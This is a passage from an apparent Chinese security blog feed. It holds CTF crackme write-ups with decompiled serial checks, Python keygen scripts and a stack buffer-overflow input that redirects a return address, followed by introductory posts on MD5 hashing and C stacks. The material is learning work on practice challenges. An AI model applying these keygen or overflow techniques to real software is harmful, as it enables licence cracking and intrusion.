class="number">1</span>) + <span class="number">5</span></div><div class="line">v53 = ((v7 &gt;&gt; <span class="number">1</span>) &amp; <span class="number">1</span>) + <span class="number">5</span></div><div class="line">v55 = ((v7 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">1</span>) + <span class="number">5</span></div><div class="line">v57 = ((v7 &gt;&gt; <span class="number">3</span>) &amp; <span class="number">1</span>) + <span class="number">5</span></div><div class="line"></div><div class="line">v9=name[<span class="number">1</span>]</div><div class="line">v45 = (v9 &amp; <span class="number">1</span>) + <span class="number">1</span></div><div class="line">v51 = ((v9 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">1</span>) + <span class="number">1</span></div><div class="line">v47 = ((v9 &gt;&gt; <span class="number">1</span>) &amp; <span class="number">1</span>) + <span class="number">1</span></div><div class="line">v10 = ((v9 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">1</span>) + <span class="number">1</span></div><div class="line">v49 = ((v9 &gt;&gt; <span class="number">3</span>) &amp; <span class="number">1</span>) + <span class="number">1</span></div><div class="line"></div><div class="line">v8+v10=serial[<span class="number">0</span>]</div><div class="line">v57+v49==serial[<span class="number">1</span>]</div><div class="line">v53+v51==serial[<span class="number">2</span>]</div><div class="line">v55+v45==serial[<span class="number">3</span>]</div><div class="line">v59+v47==serial[<span class="number">4</span>]</div><div class="line"></div><div class="line">=====================</div><div class="line"></div><div class="line">v26=name[<span class="number">2</span>]</div><div class="line">v27 = (v26 &amp; <span class="number">1</span>) + <span class="number">5</span></div><div class="line">v60 = ((v26 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">1</span>) + <span class="number">5</span></div><div class="line">v54 = ((v26 &gt;&gt; <span class="number">1</span>) &amp; <span class="number">1</span>) + <span class="number">5</span></div><div class="line">v56 = ((v26 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">1</span>) + <span class="number">5</span></div><div class="line">v58 = ((v26 &gt;&gt; <span class="number">3</span>) &amp; <span class="number">1</span>) + <span class="number">5</span></div><div class="line"></div><div class="line">v28=name[<span class="number">3</span>]</div><div class="line">v46 = (v28 &amp; <span class="number">1</span>) + <span class="number">1</span></div><div class="line">v52 = ((v28 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">1</span>) + <span class="number">1</span></div><div class="line">v48 = ((v28 &gt;&gt; <span class="number">1</span>) &amp; <span class="number">1</span>) + <span class="number">1</span></div><div class="line">v29 = ((v28 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">1</span>) + <span class="number">1</span></div><div class="line">v50 = ((v28 &gt;&gt; <span class="number">3</span>) &amp; <span class="number">1</span>) + <span class="number">1</span></div><div class="line"></div><div class="line"></div><div class="line">v27+v29==serial[<span class="number">5</span>]</div><div class="line">v58+v50==serial[<span class="number">6</span>]</div><div class="line">v54+v52==serial[<span class="number">7</span>]</div><div class="line">v56+v46==serial[<span class="number">8</span>]</div><div class="line">v60+v48==serial[<span class="number">9</span>]</div></pre></td></tr></table></figure></li><li><p>6)找网上的wp，写出注册机</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div></pre></td><td class="code"><pre><div class="line">serial=<span class="string">'7687677776'</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(ord(<span class="string">'a'</span>),ord(<span class="string">'z'</span>)+<span class="number">1</span>):</div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(ord(<span class="string">'a'</span>),ord(<span class="string">'z'</span>)+<span class="number">1</span>):</div><div class="line">v7=i</div><div class="line">v9=j</div><div class="line"></div><div class="line">v8 = (v7 &amp; <span class="number">1</span>) + <span class="number">5</span></div><div class="line">v59 = ((v7 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">1</span>) + <span class="number">5</span></div><div class="line">v53 = ((v7 &gt;&gt; <span class="number">1</span>) &amp; <span class="number">1</span>) + <span class="number">5</span></div><div class="line">v55 = ((v7 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">1</span>) + <span class="number">5</span></div><div class="line">v57 = ((v7 &gt;&gt; <span class="number">3</span>) &amp; <span class="number">1</span>) + <span class="number">5</span></div><div class="line"></div><div class="line">v45 = (v9 &amp; <span class="number">1</span>) + <span class="number">1</span></div><div class="line">v51 = ((v9 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">1</span>) + <span class="number">1</span></div><div class="line">v47 = ((v9 &gt;&gt; <span class="number">1</span>) &amp; <span class="number">1</span>) + <span class="number">1</span></div><div class="line">v10 = ((v9 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">1</span>) + <span class="number">1</span></div><div class="line">v49 = ((v9 &gt;&gt; <span class="number">3</span>) &amp; <span class="number">1</span>) + <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> v8+v10==int(serial[<span class="number">0</span>]) <span class="keyword">and</span> v57+v49==int(serial[<span class="number">1</span>]) <span class="keyword">and</span> v53+v51==int(serial[<span class="number">2</span>]) <span class="keyword">and</span> v55+v45==int(serial[<span class="number">3</span>]) <span class="keyword">and</span> v59+v47==int(serial[<span class="number">4</span>]):</div><div class="line"><span class="keyword">print</span> chr(i),chr(j)</div><div class="line"><span class="keyword">print</span> <span class="string">'==============='</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(ord(<span class="string">'a'</span>),ord(<span class="string">'z'</span>)+<span class="number">1</span>):</div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(ord(<span class="string">'a'</span>),ord(<span class="string">'z'</span>)+<span class="number">1</span>):</div><div class="line">v26=i</div><div class="line">v28=j</div><div class="line"></div><div class="line">v27 = (v26 &amp; <span class="number">1</span>) + <span class="number">5</span></div><div class="line">v60 = ((v26 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">1</span>) + <span class="number">5</span></div><div class="line">v54 = ((v26 &gt;&gt; <span class="number">1</span>) &amp; <span class="number">1</span>) + <span class="number">5</span></div><div class="line">v56 = ((v26 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">1</span>) + <span class="number">5</span></div><div class="line">v58 = ((v26 &gt;&gt; <span class="number">3</span>) &amp; <span class="number">1</span>) + <span class="number">5</span></div><div class="line"></div><div class="line">v46 = (v28 &amp; <span class="number">1</span>) + <span class="number">1</span></div><div class="line">v52 = ((v28 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">1</span>) + <span class="number">1</span></div><div class="line">v48 = ((v28 &gt;&gt; <span class="number">1</span>) &amp; <span class="number">1</span>) + <span class="number">1</span></div><div class="line">v29 = ((v28 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">1</span>) + <span class="number">1</span></div><div class="line">v50 = ((v28 &gt;&gt; <span class="number">3</span>) &amp; <span class="number">1</span>) + <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> v27+v29==int(serial[<span class="number">5</span>]) <span class="keyword">and</span> v58+v50==int(serial[<span class="number">6</span>]) <span class="keyword">and</span> v54+v52==int(serial[<span class="number">7</span>]) <span class="keyword">and</span> v56+v46==int(serial[<span class="number">8</span>]) <span class="keyword">and</span> v60+v48==int(serial[<span class="number">9</span>]):</div><div class="line"><span class="keyword">print</span> chr(i),chr(j)</div><div class="line">```    </div><div class="line">* <span class="number">7</span>)因为，最后一个字母是p，所以：有<span class="number">4</span>种可能结果bump,cqmp,gtmp,gpmp.试一下其中一个就行。</div><div class="line">---</div><div class="line"><span class="comment"># 例3：NSCTF Reverse 400</span></div><div class="line">**<span class="number">1.</span>题目来源：[http://www.shiyanbar.com/ctf/<span class="number">1759</span>](http://www.shiyanbar.com/ctf/<span class="number">1759</span>)**</div><div class="line">**<span class="number">2.</span>解题思路：**</div><div class="line">* 步骤：</div><div class="line">   * <span class="number">1</span>）刚开始用IDA 和 OD打开发现这可能和PY有点关系，但是没想到这是py打包成的exe文件【画个重点】</div><div class="line">   * <span class="number">2</span>）利用网上的教程，找到一个工具【pyinstxtractor】可以反编译py生成的exe文件。</div><div class="line">   * <span class="number">3</span>）如图所示：在终端输入python pyinstxtractor.py Reverse400 </div><div class="line">    ![](https://i.imgur.com/FO6E9p0.png)</div><div class="line">   * <span class="number">4</span>）进入生成的文件夹中，如图，输入:cat Revesre3</div><div class="line">    ![](https://i.imgur.com/SHjFn24.png)</div><div class="line">   * <span class="number">5</span>）输入明文flag，有错</div><div class="line">   * <span class="number">6</span>）查看_tmain()函数，发现这个函数用将字符串的前一个字符和后一个字符异或的，然后最上面有一个data变量，想到这个变量可以就是加密函数的参数，写个py脚本试试。</div><div class="line">   * <span class="number">7</span>）如图：</div><div class="line">    ![](https://i.imgur.com/s8dxoI7.png)</div><div class="line">    ![](https://i.imgur.com/GXDenQW.png)</div><div class="line">   * <span class="number">8</span>）立个flag，有空看看py逆向的东西！</div><div class="line">---</div><div class="line"><span class="comment"># 例4：证明自己吧</span></div><div class="line">**<span class="number">1.</span>题目来源：[http://www.shiyanbar.com/ctf/<span class="number">28</span>](http://www.shiyanbar.com/ctf/<span class="number">28</span>)**</div><div class="line">**<span class="number">2.</span>解题思路**</div><div class="line">* 步骤：</div><div class="line">    * <span class="number">1</span>）利用od打开，搜索字符串。</div><div class="line">    ![](https://i.imgur.com/gthujH2.png)</div><div class="line">    * <span class="number">2</span>）进入<span class="number">401060</span>函数分析，得到两条有效信息：<span class="number">1.</span>xor <span class="number">20</span>h，<span class="number">2.</span>add <span class="number">251</span></div><div class="line">    ![](https://i.imgur.com/t9ZltsP.png)</div><div class="line">    * <span class="number">3</span>）上面的伪代码太多了，太多了，主要抓取主要信息。如第二歩。</div><div class="line">    * <span class="number">4</span>）和一个字符串进行比较。首先你在跟进的时候看可以查看比较的每一个字符，当跳出循环你会发现在<span class="number">12</span>F794处有十六进制的值。</div><div class="line">    ![](https://i.imgur.com/iyGdink.png)</div><div class="line">    ![](https://i.imgur.com/lXdl3w3.png)</div><div class="line">    * <span class="number">5</span>）加密函数的加密过程复现：</div><div class="line">    ![](https://i.imgur.com/<span class="number">2</span>AfGmuB.png)</div><div class="line">    * <span class="number">5</span>）写出注册机：</div><div class="line">    ![](https://i.imgur.com/NXyu1DO.png)</div><div class="line">**<span class="number">3.</span>感悟：不要太依赖反编译器，尤其是F5选项，要注意适当截取F5选项中的有效代码**</div><div class="line"></div><div class="line"><span class="comment"># 例5：看雪CTF2017冬季赛第2题：</span></div><div class="line">**<span class="number">1.</span>题目来源：[https://ctf.pediy.com/game-fight<span class="number">-47.</span>htm](https://ctf.pediy.com/game-fight<span class="number">-47.</span>htm)**</div><div class="line">**解题思路：**</div><div class="line">* 步骤：</div><div class="line">    * <span class="number">1</span>）利用IDA打开，发现如下特征，查看伪代码，发现这一对方程组，但是这组方程式无效解</div><div class="line">    ![](https://i.imgur.com/DEtGHLJ.png)</div><div class="line">    ![](https://i.imgur.com/VVGU8xQ.png)</div><div class="line">    * <span class="number">2</span>）我们又发现一个scanf函数，知道scanf会造成溢出，跟进scanf函数里面查看，发现函数分配了大小为<span class="number">12</span>个字节的空间。</div><div class="line">    ![](https://i.imgur.com/diR40JJ.png)</div><div class="line">    * <span class="number">4</span>）根据缓冲区溢出的特点，已知缓冲区的大小是<span class="number">12</span>，如果超过该值的话，就会把后面的数据当做函数返回的下一个地址。</div><div class="line">        * <span class="number">4.1</span>）如图，没有出现缓冲区溢出，输入数据按小端压栈，**入口地址在栈底**。</div><div class="line">    ![](https://i.imgur.com/lR05VvG.png)</div><div class="line">        * <span class="number">4.2</span>）如图，如果发生缓冲区溢出，入口地址被最后输入的数据覆盖。</div><div class="line">    ![](https://i.imgur.com/MTONN5d.png)</div><div class="line">    * <span class="number">5</span>）满足条件之一，**溢出地址**，根据IDA可以看出，<span class="number">413131</span>是溢出的地址，小端显示就是<span class="number">11</span>A</div><div class="line">    ![](https://i.imgur.com/YAjr0ft.png)</div><div class="line">    * <span class="number">6</span>）输入<span class="number">12</span>个字符（任意）+<span class="number">11</span>A就可以到达溢出地址。</div><div class="line">    * <span class="number">7</span>）删除模块分析，发现花指令，**单步跟入**，得到三个方程。需要注意的是每个方程最后会有一个验证，我们需要跳过该验证。</div><div class="line">    ![](https://i.imgur.com/So3VtbI.png)</div><div class="line">    * <span class="number">8</span>）除了单步以外还可以利用run追踪了跟加密过程</div><div class="line">    ![](https://i.imgur.com/<span class="number">6</span>HseeQ6.png)</div><div class="line">    ![](https://i.imgur.com/SvB2Pfk.png)</div><div class="line">    * <span class="number">9</span>）化简得到：</div><div class="line">    ![](https://i.imgur.com/bfDFGYS.png)</div><div class="line"></div><div class="line"><span class="comment"># 例6：GCTF-逆向题Debug</span></div><div class="line">**<span class="number">1.</span>题目来源：[http://oj.xctf.org.cn/web/practice/defensetrain/db45bfc9252a4c158159255aa9b89293/](http://oj.xctf.org.cn/web/practice/defensetrain/db45bfc9252a4c158159255aa9b89293/)**</div><div class="line">**解题思路：**</div><div class="line">* 步骤：</div><div class="line">    * <span class="number">1</span>）利用IL Spy反编译</div><div class="line">    * ``` </div><div class="line">    internal <span class="class"><span class="keyword">class</span> ᜅ</span></div><div class="line">    &#123;</div><div class="line">private static int trans(int A_0, int A_1)</div><div class="line">&#123;</div><div class="line"><span class="keyword">return</span> (new int[&#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">61</span>,<span class="number">67</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">89</span>,<span class="number">97</span>,<span class="number">101</span>,<span class="number">103</span>,<span class="number">107</span>,<span class="number">109</span>,<span class="number">113</span>&#125;)[A_1] ^ A_0;</div><div class="line">&#125;</div><div class="line">private static string flag(string A_0) <span class="comment">#显示成功信息</span></div><div class="line">&#123;</div><div class="line">byte[] bytes = Encoding.ASCII.GetBytes(A_0);</div><div class="line"><span class="keyword">return</span> <span class="string">"flag&#123;"</span> + BitConverter.ToString(new MD5CryptoServiceProvider().ComputeHash(bytes)).Replace(<span class="string">"-"</span>, <span class="string">""</span>) + <span class="string">"&#125;"</span>;</div><div class="line">&#125;</div><div class="line">private static void cal(string A_0, int A_1, ref string A_2)</div><div class="line">&#123;</div><div class="line">int num = <span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> (<span class="number">0</span> &lt; A_0.Length)</div><div class="line">&#123;</div><div class="line">do</div><div class="line">&#123;</div><div class="line">char c = A_0[num];</div><div class="line">int num2 = <span class="number">1</span>;</div><div class="line">do</div><div class="line">&#123;</div><div class="line">c = Convert.ToChar(ᜅ.ᜀ(Convert.ToInt32(c), num2));</div><div class="line">num2++;</div><div class="line">&#125;</div><div class="line"><span class="keyword">while</span> (num2 &lt; <span class="number">15</span>);   <span class="comment">#内层循环控制从trans返回指定的数组成员</span></div><div class="line">A_2 += c;</div><div class="line">num++;</div><div class="line">&#125;</div><div class="line"><span class="keyword">while</span> (num &lt; A_0.Length);   <span class="comment">#外层循环控制链接从内层循环获得的值</span></div><div class="line">&#125;</div><div class="line">A_2 = flag(A_2);</div><div class="line">&#125;</div><div class="line">private static void ᜀ(string[] A_0)</div><div class="line">&#123;</div><div class="line">string b = null;</div><div class="line">string value = string.Format(<span class="string">"&#123;0&#125;"</span>, DateTime.Now.Hour + <span class="number">1</span>);</div><div class="line">string a_ = <span class="string">"CreateByTenshine"</span>;</div><div class="line">cal(a_, Convert.ToInt32(value), ref b); <span class="comment"># value没有用上</span></div><div class="line">string a = Console.ReadLine();</div><div class="line"><span class="keyword">if</span> (a == b)</div><div class="line">&#123;</div><div class="line">Console.WriteLine(<span class="string">"u got it!"</span>);</div><div class="line">Console.ReadKey(true);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">Console.Write(<span class="string">"wrong"</span>);</div><div class="line">&#125;</div><div class="line">Console.ReadKey(true);</div><div class="line">&#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></li><li><p>2）根据上面的思路，只要过一次判断即可，写出注册机</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans</span><span class="params">(a, b)</span>:</span></div><div class="line">    <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">41</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">53</span>, <span class="number">59</span>, <span class="number">61</span>, <span class="number">67</span>, <span class="number">71</span>, <span class="number">73</span>, <span class="number">79</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">97</span>, <span class="number">101</span>, <span class="number">103</span>, <span class="number">107</span>, <span class="number">109</span>, <span class="number">113</span>][b]^a</div><div class="line"><span class="keyword">print</span> trans(<span class="number">1</span>,<span class="number">10</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">cal</span><span class="params">(a, b)</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</div><div class="line">        i = ord(i)</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">15</span>):</div><div class="line">            i = trans(i, j)</div><div class="line">        b += chr(i)</div><div class="line">    <span class="keyword">return</span> b</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line">b = cal(<span class="string">'CreateByTenshine'</span>,<span class="string">''</span>)</div><div class="line">m = hashlib.md5()</div><div class="line">m.update(b)</div><div class="line"><span class="keyword">print</span> <span class="string">'flag&#123;'</span> + m.hexdigest().upper() + <span class="string">'&#125;'</span></div></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;逆向分析：&quot;&gt;&lt;a href=&quot;#逆向分析：&quot; class=&quot;headerlink&quot; title=&quot;逆向分析：&quot;&gt;&lt;/a&gt;逆向分析：&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;strong&gt;软件逆向工程（Software Reverse Engineering）又称软件反向工程，是指从可运行的程序系统出发，运用解密、反汇编、系统分析、程序理解等多种计算机技术,对软件的结构、流程、算法、代码等进行逆向拆解和分析，推导出软件产品的源代码、设计原理、结构、算法、处理过程、运行方法及相关文档等。通常，人们把对软件进行反向分析的整个过程统称为软件逆向工程，把在这个过程中所采用的技术都统称为软件逆向工程技术。&lt;/strong&gt;
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>浅探hash算法的前世今生[转]</title>
    <link href="http://yoursite.com/2017/11/18/%E6%B5%85%E6%8E%A2hash%E7%AE%97%E6%B3%95%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F/"/>
    <id>http://yoursite.com/2017/11/18/浅探hash算法的前世今生/</id>
    <published>2017-11-18T14:50:11.000Z</published>
    <updated>2017-11-21T05:35:23.138Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Q:我为什么要写这篇文章？<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A:你没发现我很久没有跟新文章了么？<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Q：为什么跟新这个内容？<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A：你一个搞安全的不研究加密算法，你还能干什么？？<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Q：你了解hash算法嘛？<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A：不了解，那还不能学啊，安全组的，你不会百度，你还学什么安全？<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后，这篇文章，我参考了网上诸多关于hash算法的文章，在此表示深深的谢意，愿我们在这知识的海洋里能继续遨游。2017.11.18夜<br><a id="more"></a></p><h1 id="hash算法"><a href="#hash算法" class="headerlink" title="hash算法"></a>hash算法</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>Hash，一般翻译做“散列”，也有直接音译为”哈希”的，就是把任意长度的输入（又叫做预映射， pre-image），通过散列算法，变换成固定长度的输出，该输出就是散列值。这种转换是一种压缩映射，也就是，散列值的空间通常远小于输入的空间，不同的输入可能会散列成相同的输出，而不可能从散列值来唯一的确定输入值。同时，只有改变里面些许的内容，hash值可能出现很大的不同。 密码学上的 Hash 又被称为”消息摘要(message digest)。</strong><br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong><font color="#DC143C">MD5 和 SHA1 可以说是目前应用最广泛的Hash算法。</font>而它们都是以 MD4 为基础设计的。参考相应RFC文档可以得到MD4(RFC 1320)、MD5(RFC 1321)算法的详细描述和算法的C源代码</strong></p><h1 id="MD5："><a href="#MD5：" class="headerlink" title="MD5："></a>MD5：</h1><ul><li>MD5介绍：<ul><li>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1990年R.L.Rivest提出哈希函数MD4,特别适合32位计算机软件实现，对于长的信息签名很实用。MD5是MD4的改进版，它比MD4更复杂，但是设计思想相似并且也产生了128位摘要。</li></ul></li><li>MD5哈希算法流程：<br>对于任意长度的明文，MD5首先对其进行分组，使得每一组的长度为512位，然后对这些明文分组反复重复处理。对于每个明文分组的摘要生成过程如下：<ul><li>(1) 将512位的明文分组划分为16个子明文分组，每个子明文分组为32位。</li><li>(2) 申请4个32位的链接变量，记为A、B、C、D。</li><li>(3) 子明文分组与链接变量进行第1轮运算。</li><li>(4) 子明文分组与链接变量进行第2轮运算。</li><li>(5) 子明文分组与链接变量进行第3轮运算。</li><li>(6) 子明文分组与链接变量进行第4轮运算。</li><li>(7) 链接变量与初始链接变量进行求和运算。</li><li>(8) 链接变量作为下一个明文分组的输入重复进行以上操作。</li><li>(9) 最后，4个链接变量里面的数据就是MD5摘要。</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Q:我为什么要写这篇文章？&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;A:你没发现我很久没有跟新文章了么？&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Q：为什么跟新这个内容？&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;A：你一个搞安全的不研究加密算法，你还能干什么？？&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Q：你了解hash算法嘛？&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;A：不了解，那还不能学啊，安全组的，你不会百度，你还学什么安全？&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;最后，这篇文章，我参考了网上诸多关于hash算法的文章，在此表示深深的谢意，愿我们在这知识的海洋里能继续遨游。2017.11.18夜&lt;br&gt;
    
    </summary>
    
      <category term="密码学" scheme="http://yoursite.com/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
  </entry>
  
  <entry>
    <title>浅谈数据结构之栈</title>
    <link href="http://yoursite.com/2017/11/12/%E6%B5%85%E8%B0%88%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E6%A0%88/"/>
    <id>http://yoursite.com/2017/11/12/浅谈数据结构之栈/</id>
    <published>2017-11-12T08:02:11.000Z</published>
    <updated>2017-11-21T05:35:23.142Z</updated>
    
    <content type="html"><![CDATA[<h2 id="栈的概念："><a href="#栈的概念：" class="headerlink" title="栈的概念："></a>栈的概念：</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>栈是一种只允许在一端进行插入或者删除的线性表，他是一种操作受限的线性表，在表中只允许进行插入或者删除的一端叫做栈顶另一端叫做栈底。栈具有先进后出（Last in first out）的性质。</strong><a id="more"></a></p><h2 id="栈的存储结构："><a href="#栈的存储结构：" class="headerlink" title="栈的存储结构："></a>栈的存储结构：</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>顺序存储和链式存储。</strong></p><h2 id="顺序存储："><a href="#顺序存储：" class="headerlink" title="顺序存储："></a>顺序存储：</h2><ul><li>利用顺序存储方式实现的栈称为顺序栈，通常0下标称之为栈底，这样空栈时栈顶指针top==-1，压栈top++，出栈 top–。</li><li><p>DAT: </p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">typedef int datatype;</div><div class="line">typedef struct </div><div class="line">&#123;</div><div class="line">datatype data[MAX];</div><div class="line">int top;</div><div class="line">&#125;SeqStack;</div></pre></td></tr></table></figure></li><li><p>初始化：</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">   <span class="function">SeqStack *<span class="title">InitStack</span><span class="params">()</span>   <span class="comment">//初始化</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">SeqStack *s = (SeqStack*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(SeqStack));</div><div class="line">s-&gt;top = <span class="number">-1</span>;</div><div class="line"><span class="keyword">return</span> s;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>压栈：</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div 